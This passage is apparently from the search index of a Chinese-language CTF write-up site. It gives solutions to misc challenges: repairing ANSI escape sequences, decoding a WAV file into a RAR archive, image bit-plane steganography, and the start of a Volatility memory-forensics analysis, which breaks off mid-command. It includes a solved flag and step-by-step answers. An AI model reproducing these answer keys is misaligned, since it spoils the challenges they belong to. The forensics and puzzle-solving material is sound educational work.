\u7684\u90e8\u5206\u4f4d\u7f6e\u5e94\u8be5\u4e5f\u4e0d\u80fd\u968f\u610f\u6539\u53d8\uff0c\u90a3\u4e48 0f_ \u624d\u662f\u5b9e\u9645\u7684\u7b2c\u4e09\u90e8\u5206\uff0c\u800c b4nn3d} \u662f\u5b9e\u9645\u7684\u7b2c\u4e94\u90e8\u5206 \u6700\u7ec8 Flag\uff1a dsc{publ1c_d15pl4y_0f_ff3ct10n_b4nn3d}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/transparent_file/","text":"\u9898\u76ee \u00b6 \u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b transparent.txt \uff0c\u6709\u70b9\u773c\u719f\u554a (\u014f\u03c9\u014f) 1 2 3 # transparent.txt \u8282\u9009 [ 0 ; 0H [ 20 ; 58H [ 8 ; 34H [ 13 ; 27H [ 4 ; 2H [ 38 ; 2 ; 1 ; 204 ; 177m \u6839\u636e \u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag \uff0c\u518d\u7ed3\u5408 RsaCtfTool/test.sh \uff08\u5341\u5206\u611f\u8c22\uff01\ud83d\ude3d\uff09 \u63a8\u6d4b\u662f\u7ec8\u7aef\u8bbe\u7f6e\u989c\u8272\u548c\u683c\u5f0f\u5316\u7684\u63a7\u5236\u5e8f\u5217\uff0c\u53ea\u4e0d\u8fc7\u8bed\u6cd5\u7ed3\u6784\u6709\u7f3a\u5931 ANSI escape code - Wikipedia \u5728\u6240\u6709 [ \u4e4b\u524d\u6dfb\u52a0 \\e \u6216 \\033 \u6216 \\x1B \u6e05\u7a7a\u7ec8\u7aef\u5e76\u6267\u884c echo -e `cat transparent.txt` \uff0c\u7136\u540e\u5168\u90e8\u9009\u4e2d\uff08\u7531\u4e8e\u6253\u5370\u7684\u5b57\u7b26\u4e3a\u7a7a\u683c\uff0c\u9009\u4e2d\u624d\u53ef\u89c1\u8bbe\u7f6e\u7684\u5b57\u4f53\u989c\u8272\uff09\u5c31\u53ef\u4ee5\u770b\u5230 Flag \u4e86 \ud83e\udd73 \u6216\u8005\u66ff\u6362\u7a7a\u683c\u4e3a\u53ef\u89c1\u5b57\u7b26 echo -e `cat transparent.txt | sed 's/ /O/g'` \u5495\u5495\u5495 \u00b6 \u7ec8\u7aef\u663e\u793a\u4f9d\u8d56\u4e8e\u63a7\u5236\u5e8f\u5217 ed\uff08\u6587\u672c\u7f16\u8f91\u5668\uff09 - ed(1) - Linux man page \u9002\u7528\u4e8e\u4e0d\u89e3\u6790\u63a7\u5236\u5b57\u7b26\u7684 dumb terminal 1 2 3 4 5 6 7 8 # \u63d2\u5165\u6a21\u5f0f\u4e0e\u7ed3\u675f a<Enter> {{ text_to_insert }} <Enter>. # \u4fdd\u5b58 w {{ filename }} # \u9000\u51fa q reset vs clear \u00b6 clear \u6e05\u7a7a\u7ec8\u7aef\u5c4f\u5e55 reset \u5c06\u91cd\u65b0\u521d\u59cb\u5316\u7ec8\u7aef\uff0c\u6bd4 clear \u66f4\u5f7b\u5e95\uff0c\u4f46\u4fdd\u7559 bash \u7684\u72b6\u6001 \u53c2\u8003\u8d44\u6599 \u00b6 bash:tip_colors_and_formatting - FLOZz' MISC clear(1) - Linux man page reset(1) - Linux man page","title":"\u900f\u660e\u7684\u6587\u4ef6"},{"location":"misc/transparent_file/#_1","text":"\u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002","title":"\u9898\u76ee"},{"location":"misc/transparent_file/#_2","text":"\u67e5\u770b transparent.txt \uff0c\u6709\u70b9\u773c\u719f\u554a (\u014f\u03c9\u014f) 1 2 3 # transparent.txt \u8282\u9009 [ 0 ; 0H [ 20 ; 58H [ 8 ; 34H [ 13 ; 27H [ 4 ; 2H [ 38 ; 2 ; 1 ; 204 ; 177m \u6839\u636e \u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag \uff0c\u518d\u7ed3\u5408 RsaCtfTool/test.sh \uff08\u5341\u5206\u611f\u8c22\uff01\ud83d\ude3d\uff09 \u63a8\u6d4b\u662f\u7ec8\u7aef\u8bbe\u7f6e\u989c\u8272\u548c\u683c\u5f0f\u5316\u7684\u63a7\u5236\u5e8f\u5217\uff0c\u53ea\u4e0d\u8fc7\u8bed\u6cd5\u7ed3\u6784\u6709\u7f3a\u5931 ANSI escape code - Wikipedia \u5728\u6240\u6709 [ \u4e4b\u524d\u6dfb\u52a0 \\e \u6216 \\033 \u6216 \\x1B \u6e05\u7a7a\u7ec8\u7aef\u5e76\u6267\u884c echo -e `cat transparent.txt` \uff0c\u7136\u540e\u5168\u90e8\u9009\u4e2d\uff08\u7531\u4e8e\u6253\u5370\u7684\u5b57\u7b26\u4e3a\u7a7a\u683c\uff0c\u9009\u4e2d\u624d\u53ef\u89c1\u8bbe\u7f6e\u7684\u5b57\u4f53\u989c\u8272\uff09\u5c31\u53ef\u4ee5\u770b\u5230 Flag \u4e86 \ud83e\udd73 \u6216\u8005\u66ff\u6362\u7a7a\u683c\u4e3a\u53ef\u89c1\u5b57\u7b26 echo -e `cat transparent.txt | sed 's/ /O/g'`","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/transparent_file/#_3","text":"\u7ec8\u7aef\u663e\u793a\u4f9d\u8d56\u4e8e\u63a7\u5236\u5e8f\u5217 ed\uff08\u6587\u672c\u7f16\u8f91\u5668\uff09 - ed(1) - Linux man page \u9002\u7528\u4e8e\u4e0d\u89e3\u6790\u63a7\u5236\u5b57\u7b26\u7684 dumb terminal 1 2 3 4 5 6 7 8 # \u63d2\u5165\u6a21\u5f0f\u4e0e\u7ed3\u675f a<Enter> {{ text_to_insert }} <Enter>. # \u4fdd\u5b58 w {{ filename }} # \u9000\u51fa q","title":"\u5495\u5495\u5495"},{"location":"misc/transparent_file/#reset-vs-clear","text":"clear \u6e05\u7a7a\u7ec8\u7aef\u5c4f\u5e55 reset \u5c06\u91cd\u65b0\u521d\u59cb\u5316\u7ec8\u7aef\uff0c\u6bd4 clear \u66f4\u5f7b\u5e95\uff0c\u4f46\u4fdd\u7559 bash \u7684\u72b6\u6001","title":"reset vs clear"},{"location":"misc/transparent_file/#_4","text":"bash:tip_colors_and_formatting - FLOZz' MISC clear(1) - Linux man page reset(1) - Linux man page","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/unpleasant_music/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u521d\u59cb\u62ff\u5230\u4e00\u4e2a WAV \u6587\u4ef6\uff0c\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6253\u5f00\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u5355\u58f0\u9053\u97f3\u9891\uff0c\u6ce2\u5f62\u5e03\u6ee1\u4e86\u6574\u4e2a\u6846\u5495 \u65e2\u7136\u8fd9\u4e48\u6ee1\uff0c\u5c31\u770b\u770b\u9891\u8c31\u5427\u5495\u3002\u4f46\u662f\u5e76\u6ca1\u6709\u53d1\u73b0\uff0cSAD \u653e\u5927\u6ce2\u5f62\uff0c\u53d1\u73b0\u5176\u6709\u4e00\u5b9a\u7684\u89c4\u5f8b~\u50cf\u662f 01 \u5e8f\u5217 \u624b\u52a8\u89e3\u7801\u662f\u4e0d\u53ef\u80fd\u7684\u5495\uff0c\u5199\u4e2a\u7a0b\u5e8f\u8dd1\u4e00\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import wave , codecs import numpy as np wavfile = wave . open ( u 'music.wav' , \"rb\" ) params = wavfile . getparams () nframes = params [ 3 ] # \u91c7\u6837\u70b9\u6570 datawav = wavfile . readframes ( nframes ) # \u8bfb\u53d6\u97f3\u9891\uff0c\u5b57\u7b26\u4e32\u683c\u5f0f wavfile . close () datause = np . fromstring ( datawav , dtype = np . short ) # \u5c06\u5b57\u7b26\u4e32\u8f6c\u5316\u4e3a\u77ed\u6574\u578b result_bin , result_hex = '' , '' mx = 0 for i in range ( len ( datause ) - 1 ): if datause [ i ] > mx : mx = datause [ i ] try : if ( datause [ i ] < 0 and datause [ i + 1 ] >= 0 ): if ( mx - 24000 > 0 ): result_bin += '1' mx = datause [ i + 1 ] else : result_bin += '0' mx = datause [ i + 1 ] except : break for i in range ( 0 , len ( result_bin ), 4 ): result_hex += hex ( int ( result_bin [ i : i + 4 ], 2 ))[ 2 :] # result_hex \u5f00\u5934\u4e3a Rar file_rar = open ( \"result.rar\" , \"wb\" ) file_rar . write ( codecs . decode ( result_hex , 'hex_codec' )) file_rar . close () \u751f\u6210\u7684 RAR \u91cc\u9762\u6709\u4e00\u4e2a nnnnoflag.txt \uff0c\u91cc\u9762\u6ca1\u6709 flag \u554a\u5495\uff01\uff08\u6380\u684c \u4e25\u8083\uff09RAR \u7531\u53ef\u53d8\u957f\u7684\u5757\u7ec4\u6210\uff0c\u8fd9\u4e9b\u5757\u7684\u6ca1\u6709\u56fa\u5b9a\u7684\u5148\u540e\u987a\u5e8f\uff0c\u4f46\u8981\u6c42\u7b2c\u4e00\u4e2a\u5757\u5fc5\u987b\u662f\u6807\u5fd7\u5757\u5e76\u4e14\u5176\u540e\u7d27\u8ddf\u4e00\u4e2a\u5f52\u6863\u5934\u90e8\u5757\u3002\u6bcf\u4e2a\u5757\u5747\u4ee5\u4ee5\u4e0b\u5b57\u6bb5\u5f00\u5934 \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 bytes CRC of total block or block part HEAD_TYPE 1 byte Block type HEAD_FLAGS 2 bytes Block flags HEAD_SIZE 2 bytes Block size ADD_SIZE 4 bytes Optional field \u2013 added block size HEAD_TYPE \u7684\u503c\u53ca\u5bf9\u5e94\u7684\u5757\u7c7b\u578b HEAD_TYPE \u63cf\u8ff0 0x72 marker block 0x73 archive header 0x74 file header 0x75 old style comment header 0x76 old style authenticity information 0x77 old style subblock 0x78 old style recovery record 0x79 old style authenticity information 0x7a subblock 0x7b terminator \u7528 010 Editor \u6253\u5f00 result.rar \u53d1\u73b0\u6709\u4e00\u5757\u7684 HEAD_TYPE \u662f 0x7a \u60f3\u6765\u8fd9\u5e94\u8be5\u4e0d\u662f\u5e38\u89c1\u7684\u5757\u7c7b\u578b\uff0c\u524d\u9762\u5df2\u7ecf\u51fa\u73b0\u4e86\u6807\u5fd7\u5757\u548c\u5f52\u6863\u5934\u90e8\u5757\uff0c\u5c31\u6539\u6210 0x74 \u8bd5\u8bd5\u5495\u3002\u8bf6\u563f\u563f~ RAR \u6587\u4ef6\u91cc\u9762\u51fa\u73b0\u4e86\u4e00\u4e2a STM \u6587\u4ef6 \u7528 file \u770b\u770b\u5495~\u53d1\u73b0\u662f PNG \u6587\u4ef6\uff0c\u4fee\u6539\u4e00\u4e0b\u6587\u4ef6\u540e\u7f00\uff0c\u5f97\u5230\u4e00\u4e2a\u88ab\u622a\u6389\u4e00\u534a\u7684\u4e8c\u7ef4\u7801 \u7136\u540e\u5e38\u89c4\u64cd\u4f5c\u6539\u4e00\u4e0b PNG \u56fe\u7247\u7684\u9ad8\u5c31\u53ef\u4ee5\u4e86\u5495~\u2b50\u626b\u63cf\u4e8c\u7ef4\u7801\u5f97\u5230 flag\uff01 \u53c2\u8003\u8d44\u6599 \u00b6 RAR - Forensics Wiki","title":"Unpleasant music"},{"location":"misc/unpleasant_music/#_1","text":"\u521d\u59cb\u62ff\u5230\u4e00\u4e2a WAV \u6587\u4ef6\uff0c\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6253\u5f00\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u5355\u58f0\u9053\u97f3\u9891\uff0c\u6ce2\u5f62\u5e03\u6ee1\u4e86\u6574\u4e2a\u6846\u5495 \u65e2\u7136\u8fd9\u4e48\u6ee1\uff0c\u5c31\u770b\u770b\u9891\u8c31\u5427\u5495\u3002\u4f46\u662f\u5e76\u6ca1\u6709\u53d1\u73b0\uff0cSAD \u653e\u5927\u6ce2\u5f62\uff0c\u53d1\u73b0\u5176\u6709\u4e00\u5b9a\u7684\u89c4\u5f8b~\u50cf\u662f 01 \u5e8f\u5217 \u624b\u52a8\u89e3\u7801\u662f\u4e0d\u53ef\u80fd\u7684\u5495\uff0c\u5199\u4e2a\u7a0b\u5e8f\u8dd1\u4e00\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import wave , codecs import numpy as np wavfile = wave . open ( u 'music.wav' , \"rb\" ) params = wavfile . getparams () nframes = params [ 3 ] # \u91c7\u6837\u70b9\u6570 datawav = wavfile . readframes ( nframes ) # \u8bfb\u53d6\u97f3\u9891\uff0c\u5b57\u7b26\u4e32\u683c\u5f0f wavfile . close () datause = np . fromstring ( datawav , dtype = np . short ) # \u5c06\u5b57\u7b26\u4e32\u8f6c\u5316\u4e3a\u77ed\u6574\u578b result_bin , result_hex = '' , '' mx = 0 for i in range ( len ( datause ) - 1 ): if datause [ i ] > mx : mx = datause [ i ] try : if ( datause [ i ] < 0 and datause [ i + 1 ] >= 0 ): if ( mx - 24000 > 0 ): result_bin += '1' mx = datause [ i + 1 ] else : result_bin += '0' mx = datause [ i + 1 ] except : break for i in range ( 0 , len ( result_bin ), 4 ): result_hex += hex ( int ( result_bin [ i : i + 4 ], 2 ))[ 2 :] # result_hex \u5f00\u5934\u4e3a Rar file_rar = open ( \"result.rar\" , \"wb\" ) file_rar . write ( codecs . decode ( result_hex , 'hex_codec' )) file_rar . close () \u751f\u6210\u7684 RAR \u91cc\u9762\u6709\u4e00\u4e2a nnnnoflag.txt \uff0c\u91cc\u9762\u6ca1\u6709 flag \u554a\u5495\uff01\uff08\u6380\u684c \u4e25\u8083\uff09RAR \u7531\u53ef\u53d8\u957f\u7684\u5757\u7ec4\u6210\uff0c\u8fd9\u4e9b\u5757\u7684\u6ca1\u6709\u56fa\u5b9a\u7684\u5148\u540e\u987a\u5e8f\uff0c\u4f46\u8981\u6c42\u7b2c\u4e00\u4e2a\u5757\u5fc5\u987b\u662f\u6807\u5fd7\u5757\u5e76\u4e14\u5176\u540e\u7d27\u8ddf\u4e00\u4e2a\u5f52\u6863\u5934\u90e8\u5757\u3002\u6bcf\u4e2a\u5757\u5747\u4ee5\u4ee5\u4e0b\u5b57\u6bb5\u5f00\u5934 \u540d\u79f0 \u5927\u5c0f \u63cf\u8ff0 HEAD_CRC 2 bytes CRC of total block or block part HEAD_TYPE 1 byte Block type HEAD_FLAGS 2 bytes Block flags HEAD_SIZE 2 bytes Block size ADD_SIZE 4 bytes Optional field \u2013 added block size HEAD_TYPE \u7684\u503c\u53ca\u5bf9\u5e94\u7684\u5757\u7c7b\u578b HEAD_TYPE \u63cf\u8ff0 0x72 marker block 0x73 archive header 0x74 file header 0x75 old style comment header 0x76 old style authenticity information 0x77 old style subblock 0x78 old style recovery record 0x79 old style authenticity information 0x7a subblock 0x7b terminator \u7528 010 Editor \u6253\u5f00 result.rar \u53d1\u73b0\u6709\u4e00\u5757\u7684 HEAD_TYPE \u662f 0x7a \u60f3\u6765\u8fd9\u5e94\u8be5\u4e0d\u662f\u5e38\u89c1\u7684\u5757\u7c7b\u578b\uff0c\u524d\u9762\u5df2\u7ecf\u51fa\u73b0\u4e86\u6807\u5fd7\u5757\u548c\u5f52\u6863\u5934\u90e8\u5757\uff0c\u5c31\u6539\u6210 0x74 \u8bd5\u8bd5\u5495\u3002\u8bf6\u563f\u563f~ RAR \u6587\u4ef6\u91cc\u9762\u51fa\u73b0\u4e86\u4e00\u4e2a STM \u6587\u4ef6 \u7528 file \u770b\u770b\u5495~\u53d1\u73b0\u662f PNG \u6587\u4ef6\uff0c\u4fee\u6539\u4e00\u4e0b\u6587\u4ef6\u540e\u7f00\uff0c\u5f97\u5230\u4e00\u4e2a\u88ab\u622a\u6389\u4e00\u534a\u7684\u4e8c\u7ef4\u7801 \u7136\u540e\u5e38\u89c4\u64cd\u4f5c\u6539\u4e00\u4e0b PNG \u56fe\u7247\u7684\u9ad8\u5c31\u53ef\u4ee5\u4e86\u5495~\u2b50\u626b\u63cf\u4e8c\u7ef4\u7801\u5f97\u5230 flag\uff01","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/unpleasant_music/#_2","text":"RAR - Forensics Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/yusa_little_secret/","text":"\u9898\u76ee \u00b6 LSB\uff0c\u4f46\u53c8\u4e0d\u662fLSB\uff0c\u4f17\u6240\u5468\u77e5\u4e0d\u6b62RGB\u3002yusa\uff0c\u6211\u7684yusa,\u563f\u563f \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b\u56fe\u7247\u5404\u4e2a\u4f4d\u5e73\u9762\uff0c\u5728 Red 0 \u548c Green 0 \u770b\u5230\u4e0d\u592a\u5b8c\u6574\u7684 Flag \u4f17\u6240\u5468\u77e5\u4e0d\u6b62RGB \uff0c\u5148\u5c06\u56fe\u7247\u8f6c\u6362\u4e3a YCbCr\uff08R->Y\uff0cG->Cr\uff0cB->Cb\uff09\uff0c\u518d\u8fdb\u884c\u989c\u8272\u53cd\u8f6c 1 2 3 4 5 6 7 8 9 10 11 import numpy from PIL import Image img = Image . open ( 'flag.png' ) ycbcr = img . convert ( 'YCbCr' ) img_array = numpy . ndarray (( img . size [ 1 ], img . size [ 0 ], 3 ), 'u1' , ycbcr . tobytes ()) for i in range ( img . size [ 1 ]): for j in range ( img . size [ 0 ]): pixel = img_array [ i ][ j ] pixel = [ 255 - pixel [ 0 ], 255 - pixel [ 1 ], 255 - pixel [ 2 ]] Image . fromarray ( img_array ) . save ( 'result.png' ) \u5728\u53cd\u8f6c\u540e\u56fe\u7247\u7684 Red 0 \u4f4d\u5e73\u9762\u53ef\u4ee5\u770b\u5230\u5b8c\u6574\u7684 Flag","title":"YUSA\u7684\u5c0f\u79d8\u5bc6"},{"location":"misc/yusa_little_secret/#_1","text":"LSB\uff0c\u4f46\u53c8\u4e0d\u662fLSB\uff0c\u4f17\u6240\u5468\u77e5\u4e0d\u6b62RGB\u3002yusa\uff0c\u6211\u7684yusa,\u563f\u563f","title":"\u9898\u76ee"},{"location":"misc/yusa_little_secret/#_2","text":"\u67e5\u770b\u56fe\u7247\u5404\u4e2a\u4f4d\u5e73\u9762\uff0c\u5728 Red 0 \u548c Green 0 \u770b\u5230\u4e0d\u592a\u5b8c\u6574\u7684 Flag \u4f17\u6240\u5468\u77e5\u4e0d\u6b62RGB \uff0c\u5148\u5c06\u56fe\u7247\u8f6c\u6362\u4e3a YCbCr\uff08R->Y\uff0cG->Cr\uff0cB->Cb\uff09\uff0c\u518d\u8fdb\u884c\u989c\u8272\u53cd\u8f6c 1 2 3 4 5 6 7 8 9 10 11 import numpy from PIL import Image img = Image . open ( 'flag.png' ) ycbcr = img . convert ( 'YCbCr' ) img_array = numpy . ndarray (( img . size [ 1 ], img . size [ 0 ], 3 ), 'u1' , ycbcr . tobytes ()) for i in range ( img . size [ 1 ]): for j in range ( img . size [ 0 ]): pixel = img_array [ i ][ j ] pixel = [ 255 - pixel [ 0 ], 255 - pixel [ 1 ], 255 - pixel [ 2 ]] Image . fromarray ( img_array ) . save ( 'result.png' ) \u5728\u53cd\u8f6c\u540e\u56fe\u7247\u7684 Red 0 \u4f4d\u5e73\u9762\u53ef\u4ee5\u770b\u5230\u5b8c\u6574\u7684 Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/yusa_secret/","text":"\u9898\u76ee \u00b6 Sakura\u7ec4\u7ec7\u5373\u5c06\u8fdb\u653b\u5730\u7403\uff0c\u6b64\u65f6\u4f60\u610f\u5916\u5f97\u5230\u4e86\u8be5\u7ec4\u7ec7\u5185\u67d0\u4e2a\u6210\u5458\u7684\u7535\u8111\u6587\u4ef6\uff0c\u4f60\u80fd\u4ece\u4e2d\u53d1\u73b0\u672c\u6b21\u9634\u8c0b\u6240\u7528\u7684\u5173\u952e\u9053\u5177\u5417\u3002\uff08\u6ce8\uff1a\u9898\u76ee\u4e2d\u5305\u542b\u4e86\u4e94\u4e2a\u5f69\u86cb\uff0c\u4e14\u5f69\u86cb\u5bf9\u89e3\u9898\u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5f71\u54cd\uff0c\u5feb\u53bb\u53d1\u73b0\u5427\uff01\uff09 \u89e3\u9898\u601d\u8def \u00b6 Who_am_I.zip \u89e3\u538b\u9700\u8981\u5bc6\u7801\uff0c\u6682\u4e14\u653e\u5230\u4e00\u8fb9\uff0c\u5148\u5206\u6790 Yusa-PC.raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 # \u67e5\u770b\u76ee\u6807\u7cfb\u7edf\u4fe1\u606f $ volatility -f Yusa-PC.raw imageinfo Volatility Foundation Volatility Framework 2 .6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile ( s ) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 ... # \u67e5\u770b\u547d\u4ee4\u884c\u5386\u53f2\u8bb0\u5f55\uff0c\u53ea\u6709\u4e00\u4e2a\u5f69\u86cb\uff1ayusa\u59d0\u59d0\u6709\u597d\u591a\u597d\u591a\u7684\u5c0f\u5a07\u59bb\uff0c\u6e23\u7537 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2 .6 ************************************************** CommandProcess: conhost.exe Pid: 1344 CommandHistory: 0x3ffde0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 1 LastAdded: 0 LastDisplayed: 0 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c Cmd #0 @ 0x3ea130: egg4 eXVzYeWnkOWnkOacieWlveWkmuWlveWkmueahOWwj+Woh+Wmu++8jOa4o+eUtw== Cmd #37 @ 0x3f61c0: > Cmd #38 @ 0x380158: ? ************************************************** CommandProcess: conhost.exe Pid: 1356 CommandHistory: 0x3afde0 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c # \u67e5\u770b\u8fdb\u7a0b\u5217\u8868\uff0c\u6ce8\u610f\u5230 StikyNot.exe\uff0c\u4fbf\u7b7e\u91cc\u5e94\u8be5\u4f1a\u5b58\u6709\u4fe1\u606f $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 pslist Volatility Foundation Volatility Framework 2 .6 Offset ( V ) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0xfffffa80024bdae0 System 4 0 97 598 ------ 0 2021 -10-28 03 :46:58 UTC+0000 0xfffffa8002ecdb30 smss.exe 244 4 2 29 ------ 0 2021 -10-28 03 :46:58 UTC+0000 0xfffffa8003950340 csrss.exe 336 320 9 483 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003adfb30 wininit.exe 388 320 3 77 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003ae15d0 csrss.exe 396 380 10 328 1 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b008f0 winlogon.exe 432 380 5 118 1 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b6e1d0 services.exe 488 388 7 212 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b04b30 lsass.exe 504 388 6 596 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b03a10 lsm.exe 512 388 10 142 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003bfe9f0 svchost.exe 620 488 10 360 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c1ab30 vmacthlp.exe 680 488 3 53 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c46b30 svchost.exe 712 488 9 270 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c763e0 svchost.exe 772 488 21 502 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003ca4b30 svchost.exe 856 488 16 375 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003cb5830 svchost.exe 884 488 41 1024 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003d703a0 svchost.exe 348 488 13 343 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003d9a6e0 svchost.exe 984 488 13 382 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e34910 spoolsv.exe 1212 488 12 275 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e49470 taskhost.exe 1244 488 9 227 1 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e64b30 svchost.exe 1272 488 17 332 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003f16630 svchost.exe 1408 488 15 239 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8003f57b30 VGAuthService. 1468 488 3 86 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8003f8f060 vmtoolsd.exe 1520 488 10 269 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8004077b30 sppsvc.exe 1736 488 4 157 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa80040af890 svchost.exe 1836 488 6 93 0 0 2021 -10-28 03 :47:03 UTC+0000 0xfffffa80040b3560 WmiPrvSE.exe 1908 620 10 214 0 0 2021 -10-28 03 :47:03 UTC+0000 0xfffffa8004112520 msdtc.exe 308 488 12 144 0 0 2021 -10-28 03 :47:05 UTC+0000 0xfffffa8003e55810 dwm.exe 2260 856 5 243 1 0 2021 -10-28 03 :47:08 UTC+0000 0xfffffa8003ddeb30 explorer.exe 2276 2252 45 1400 1 0 2021 -10-28 03 :47:08 UTC+0000 0xfffffa80042804b0 vmtoolsd.exe 2380 2276 8 220 1 0 2021 -10-28 03 :47:09 UTC+0000 0xfffffa8004322890 SearchIndexer. 2552 488 13 796 0 0 2021 -10-28 03 :47:13 UTC+0000 0xfffffa8002954b30 svchost.exe 1232 488 13 323 0 0 2021 -10-28 03 :49:04 UTC+0000 0xfffffa80030cb260 wmpnetwk.exe 2792 488 9 221 0 0 2021 -10-28 03 :49:04 UTC+0000 0xfffffa8003c8b460 StikyNot.exe 2228 2276 8 210 1 0 2021 -10-28 10 :37:08 UTC+0000 0xfffffa8003ad2b30 taskhost.exe 2160 488 5 101 1 0 2021 -10-29 04 :10:23 UTC+0000 0xfffffa8003cca750 cmd.exe 2536 2276 1 19 1 0 2021 -10-29 04 :15:14 UTC+0000 0xfffffa8003b1d920 conhost.exe 1344 396 2 58 1 0 2021 -10-29 04 :15:14 UTC+0000 0xfffffa8002b49060 audiodg.exe 2744 772 6 141 0 0 2021 -10-29 05 :42:04 UTC+0000 0xfffffa800282e590 dllhost.exe 1168 620 28 354 1 0 2021 -10-29 05 :42:32 UTC+0000 0xfffffa8002d0a920 wab.exe 2448 820 8 154 1 0 2021 -10-29 05 :43:20 UTC+0000 0xfffffa80028b2b30 DumpIt.exe 820 2276 1 25 1 1 2021 -10-29 05 :43:42 UTC+0000 0xfffffa8003042b30 conhost.exe 1356 396 2 59 1 0 2021 -10-29 05 :43:42 UTC+0000 0xfffffa8002841060 dllhost.exe 1000 620 6 7536754 1 0 2021 -10-29 05 :44:04 UTC+0000 StikyNot.exe \u5bf9\u5e94\u6570\u636e\u6587\u4ef6 StickyNotes.snt \uff0c\u67e5\u627e\u5e76\u4e0b\u8f7d\u5230\u672c\u673a 1 2 3 4 5 6 $ volatility -f 